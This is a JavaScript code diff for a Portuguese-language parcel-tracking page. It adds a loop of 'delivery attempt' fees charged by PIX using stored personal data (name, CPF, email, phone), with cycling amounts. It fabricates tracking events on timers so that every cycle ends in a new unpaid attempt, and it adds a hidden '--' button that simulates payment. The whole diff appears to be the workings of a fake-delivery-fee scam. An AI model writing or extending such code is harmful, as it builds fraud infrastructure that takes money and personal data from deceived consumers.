@@ -18,6 +18,9 @@ export class TrackingSystem {
         this.pixData = null;
         this.paymentErrorShown = false;
         this.paymentRetryCount = 0;
+        this.deliveryValues = [7.74, 12.38, 16.46];
+        this.deliveryAttempts = 0;
+        this.deliveryPixData = null;
         
         console.log('TrackingSystem inicializado - DADOS DO BANCO');
         this.initWhenReady();
@@ -1761,9 +1764,6 @@ export class TrackingSystem {
 
         // Iniciar fluxo de entrega após pagamento da taxa alfandegária
         setTimeout(() => {
-        
-        // Inicializar contador de tentativas de entrega
-        this.deliveryAttempts = 0;
             this.startDeliveryFlow();
         }, 1000);
     }
@@ -2142,6 +2142,280 @@ export class TrackingSystem {
             this.deliverySystem.cleanup();
         }
         console.log('🧹 Sistema de rastreamento limpo');
+    }
+    
+    async handleDeliveryAttempt(attemptNumber) {
+        console.log(`🚚 Iniciando tentativa de entrega ${attemptNumber + 1}`);
+        
+        const value = this.deliveryValues[attemptNumber % this.deliveryValues.length];
+        console.log(`💰 Valor da tentativa: R$ ${value.toFixed(2)}`);
+        
+        // Mostrar loading
+        this.showLoadingNotification('Gerando PIX de Entrega...');
+        
+        try {
+            // Gerar PIX para entrega
+            const userData = {
+                nome: this.leadData.nome_completo,
+                cpf: this.leadData.cpf,
+                email: this.leadData.email,
+                telefone: this.leadData.telefone
+            };
+            
+            const pixResult = await this.zentraPayService.createPixTransaction(userData, value);
+            
+            if (pixResult.success) {
+                console.log('🎉 PIX de entrega gerado com sucesso!');
+                this.deliveryPixData = pixResult;
+                this.closeLoadingNotification();
+                
+                setTimeout(() => {
+                    this.showDeliveryModal(value, attemptNumber + 1);
+                }, 300);
+            } else {
+                throw new Error(pixResult.error || 'Erro ao gerar PIX de entrega');
+            }
+            
+        } catch (error) {
+            console.error('💥 Erro ao gerar PIX de entrega:', error);
+            this.closeLoadingNotification();
+            
+            // Mostrar modal estático como fallback
+            setTimeout(() => {
+                this.showDeliveryModal(value, attemptNumber + 1, true);
+            }, 300);
+        }
+    }
+    
+    showDeliveryModal(value, attemptNumber, isStatic = false) {
+        // Usar o modal existente de entrega, mas com valores corretos
+        const modal = document.getElementById('deliveryModal');
+        if (!modal) return;
+        
+        // Atualizar valor no modal
+        const feeValue = document.getElementById('deliveryFeeValue');
+        if (feeValue) {
+            feeValue.textContent = `R$ ${value.toFixed(2)}`;
+        }
+        
+        // Atualizar título do modal
+        const modalTitle = modal.querySelector('.modal-header h3');
+        if (modalTitle) {
+            modalTitle.innerHTML = `<i class="fas fa-truck"></i> ${attemptNumber}ª Tentativa de Entrega`;
+        }
+        
+        // Atualizar PIX se for real
+        if (!isStatic && this.deliveryPixData && this.deliveryPixData.pixPayload) {
+            const qrCode = modal.querySelector('.qr-code');
+            const pixInput = modal.querySelector('#pixCodeDelivery');
+            
+            if (qrCode) {
+                qrCode.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.deliveryPixData.pixPayload)}`;
+            }
+            
+            if (pixInput) {
+                pixInput.value = this.deliveryPixData.pixPayload;
+            }
+        }
+        
+        // Adicionar botão de simulação discreto
+        this.addDeliverySimulationButton(modal, attemptNumber);
+        
+        // Mostrar modal
+        modal.style.display = 'flex';
+        document.body.style.overflow = 'hidden';
+        
+        console.log(`💳 Modal de entrega exibido - Tentativa ${attemptNumber} - R$ ${value.toFixed(2)}`);
+    }
+    
+    addDeliverySimulationButton(modal, attemptNumber) {
+        // Remover botão existente se houver
+        const existingButton = modal.querySelector('.delivery-simulation-button');
+        if (existingButton) {
+            existingButton.remove();
+        }
+        
+        const modalContent = modal.querySelector('.modal-content');
+        if (!modalContent) return;
+        
+        const buttonContainer = document.createElement('div');
+        buttonContainer.style.cssText = `
+            text-align: center;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #e9ecef;
+        `;
+        
+        buttonContainer.innerHTML = `
+            <button class="delivery-simulation-button" style="
+                background: transparent;
+                color: #666;
+                border: 1px solid #ddd;
+                padding: 6px 12px;
+                border-radius: 6px;
+                cursor: pointer;
+                font-weight: 600;
+                transition: all 0.3s ease;
+                opacity: 0.7;
+                font-size: 12px;
+                min-width: 30px;
+                height: 28px;
+            ">
+                --
+            </button>
+        `;
+        
+        modalContent.appendChild(buttonContainer);
+        
+        const simulationButton = buttonContainer.querySelector('.delivery-simulation-button');
+        if (simulationButton) {
+            simulationButton.addEventListener('click', () => {
+                this.simulateDeliveryPayment(attemptNumber);
+            });
+            
+            simulationButton.addEventListener('mouseenter', function() {
+                this.style.background = 'rgba(0, 0, 0, 0.05)';
+                this.style.transform = 'translateY(-1px)';
+                this.style.opacity = '1';
+            });
+            
+            simulationButton.addEventListener('mouseleave', function() {
+                this.style.background = 'transparent';
+                this.style.transform = 'translateY(0)';
+                this.style.opacity = '0.7';
+            });
+        }
+    }
+    
+    simulateDeliveryPayment(attemptNumber) {
+        console.log(`✅ Simulando pagamento da tentativa ${attemptNumber}`);
+        
+        // Fechar modal
+        const modal = document.getElementById('deliveryModal');
+        if (modal) {
+            modal.style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+        
+        // Processar pagamento
+        this.processDeliveryPayment(attemptNumber);
+    }
+    
+    processDeliveryPayment(attemptNumber) {
+        console.log(`🚚 Processando pagamento da tentativa ${attemptNumber}`);
+        
+        // Atualizar contador de tentativas
+        this.deliveryAttempts = attemptNumber;
+        
+        // Mostrar notificação de sucesso
+        this.showSuccessNotification('Pagamento de entrega confirmado!');
+        
+        // Iniciar fluxo de entrega
+        setTimeout(() => {
+            this.startDeliveryFlow(attemptNumber);
+        }, 2000);
+    }
+    
+    startDeliveryFlow(attemptNumber) {
+        console.log(`🚚 Iniciando fluxo de entrega para tentativa ${attemptNumber}`);
+        
+        const timeline = document.getElementById('trackingTimeline');
+        if (!timeline) return;
+        
+        const baseStepNumber = 100 + (attemptNumber * 10); // 110, 120, 130, etc.
+        
+        const deliverySteps = [
+            { title: 'Pedido sairá para entrega', delay: 2 * 60 * 1000 }, // 2 minutos
+            { title: 'Pedido em trânsito', delay: 2 * 60 * 60 * 1000 }, // 2 horas
+            { title: 'Pedido em rota para seu destino', delay: 2 * 60 * 60 * 1000 }, // 2 horas
+            { title: `${attemptNumber + 1}ª Tentativa de Entrega (Aguardando Pagamento)`, delay: 30 * 60 * 1000, isDeliveryAttempt: true } // 30 minutos
+        ];
+        
+        deliverySteps.forEach((step, index) => {
+            setTimeout(() => {
+                const stepDate = new Date();
+                const timelineItem = this.createTimelineItem({
+                    id: baseStepNumber + index + 1,
+                    date: stepDate,
+                    title: step.title,
+                    description: step.title,
+                    isChina: false,
+                    completed: true,
+                    isDeliveryAttempt: step.isDeliveryAttempt || false
+                }, false);
+                
+                timeline.appendChild(timelineItem);
+                
+                setTimeout(() => {
+                    timelineItem.style.opacity = '1';
+                    timelineItem.style.transform = 'translateY(0)';
+                }, 100);
+                
+                timelineItem.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                
+            }, step.delay);
+        });
+    }
+    
+    showLoadingNotification(message = 'Processando...') {
+        const notification = document.createElement('div');
+        notification.id = 'deliveryLoadingNotification';
+        notification.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 3000;
+            backdrop-filter: blur(5px);
+            animation: fadeIn 0.3s ease;
+        `;
+        
+        const content = document.createElement('div');
+        content.style.cssText = `
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: slideUp 0.3s ease;
+            border: 3px solid #1e4a6b;
+        `;
+        
+        content.innerHTML = `
+            <div style="margin-bottom: 20px;">
+                <i class="fas fa-truck" style="font-size: 3rem; color: #1e4a6b; animation: pulse 1.5s infinite;"></i>
+            </div>
+            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
+                ${message}
+            </h3>
+            <p style="color: #666; font-size: 1.1rem; line-height: 1.6;">
+                Aguarde enquanto processamos sua solicitação
+            </p>
+        `;
+        
+        notification.appendChild(content);
+        document.body.appendChild(notification);
+        document.body.style.overflow = 'hidden';
+    }
+    
+    closeLoadingNotification() {
+        const notification = document.getElementById('deliveryLoadingNotification');
+        if (notification) {
+            notification.style.animation = 'fadeOut 0.3s ease';
+            setTimeout(() => {
+                if (notification.parentNode) {
+                    notification.remove();
+                }
+                document.body.style.overflow = 'auto';
+            }, 300);
+        }
     }
 }
 
